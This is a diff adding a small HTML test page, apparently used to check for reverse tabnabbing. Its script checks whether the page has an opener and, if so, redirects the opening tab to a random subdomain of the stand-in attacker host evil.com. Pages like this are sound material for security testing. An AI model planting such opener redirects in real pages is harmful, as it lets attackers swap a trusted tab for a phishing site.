@@ -1,0 +1,27 @@
+<html>
+<head>
+<title>Reverse Tabnabbing Manual Target</title>
+</head>
+<body>
+Can I access the <i>opener</i>?
+<div id="result">result:</div>
+<script>
+    function makeid(length) {
+        var result           = '';
+        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for ( var i = 0; i < length; i++ ) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+        return result;
+    }
+    if (opener){
+        document.getElementById("result").innerHTML = "opener existing";
+        opener.location="http://" + makeid(5) + ".evil.com"
+    } else {
+        document.getElementById("result").innerHTML = "no opener";
+    }
+</script>
+</body>
+</html>
+ 
